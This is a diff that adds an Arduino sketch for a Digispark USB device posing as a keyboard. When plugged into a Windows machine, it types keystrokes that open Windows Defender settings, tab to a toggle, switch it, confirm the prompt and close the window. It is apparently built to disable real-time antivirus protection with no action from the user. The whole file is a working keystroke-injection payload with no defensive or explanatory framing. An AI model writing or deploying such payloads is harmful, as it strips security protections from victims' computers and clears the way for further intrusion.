@@ -1,0 +1,34 @@
+#include "DigiKeyboard.h"
+
+void setup() {}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print("Windows Defender Settings");
+  DigiKeyboard.delay(2500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2500);
+  DigiKeyboard.sendKeyStroke(43);
+  DigiKeyboard.sendKeyStroke(43);
+  DigiKeyboard.sendKeyStroke(43);
+  DigiKeyboard.sendKeyStroke(43);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(44);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_F4,MOD_ALT_LEFT);
+
+  
+
+  for(;;){ /*empty*/} 
+}
